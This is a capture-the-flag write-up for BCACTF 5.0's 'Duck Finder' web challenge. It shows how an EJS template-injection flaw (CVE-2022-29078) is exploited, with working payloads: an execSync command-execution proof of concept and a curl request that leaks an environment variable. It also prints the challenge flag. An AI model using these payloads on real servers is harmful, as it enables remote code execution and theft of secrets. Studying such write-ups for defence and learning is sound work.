# BCACTF 5.0

## Duck Finder

> This old service lets you make some interesting queries. It hasn't been updated in a while, though.
> 
> Author: Thomas
> 
> [`server.zip`](server.zip)

Tags: _web__

## Solution
We get the source of a small web application the allows us to search for duck informations. The description suggest that we are looking for a vulnerability, since the service is old and was not updated for a while. Lets check the source code. It imports a specific version of `express` and `ejs` (embedded JavaScript templates), maybe some sort of `SSTI`.

```js
import express from 'npm:express@4.18.2'
import 'npm:ejs@3.1.6'
```

After a quick research we find an interesting vulnerability (`CVE-2022-29078`) that allows `RCE` with this specific version. There is a nice writeup [`here`](https://eslam.io/posts/ejs-server-side-template-injection-rce/). The two important parts are noted below. The template engine allows user to pass in settings. Settings `[view options]` lets us inject code as `outputFunctionName`. 

```js
// Undocumented after Express 2, but still usable, esp. for
// items that are unsafe to be passed along with data, like `root`
viewOpts = data.settings['view options'];
if (viewOpts) {
    utils.shallowCopy(opts, viewOpts);
}
...
prepended +=
    '  var __output = "";\n' +
    '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
if (opts.outputFunctionName) {
    prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
```

The poc suggest the following payload.

```js
x;process.mainModule.require('child_process').execSync('touch /tmp/pwned');s
```

That would expand to 

```js
var x;process.mainModule.require('child_process').execSync('touch /tmp/pwned');s = __append;
```

The code between will be executed. Thats cool and all, so we can in theory run system commands and do all sorts of stuff. Now we need to exfiltrate the flag. Sending it to a webhook or creating a reverse shell (if possible). But we also have access to `__output` that will be displayed on the page, so we can just write to output whatever we like, for instance the flag.

But where is the flag? If we check the code again we have one important prerequisite that is checked:
```js
if (!Deno.env.has('FLAG')) {
    throw new Error('flag is not configured')
}
```

So the flag is in the environment variables, our final payload looks like this

```js
breed=Mallard&settings[view options][outputFunctionName]=x;__output=Deno.env.get('FLAG');s
```

Calling it, gives us the flag.

```bash
curl -XPOST http://challs.bcactf.com:30684/ -d "breed=Mallard&settings[view options][outputFunctionName]=x;__output=Deno.env.get('FLAG');s"
```

Flag `bcactf{a_l1Ttl3_0uTd4T3d_qYR8IeICVTLPU0uK}`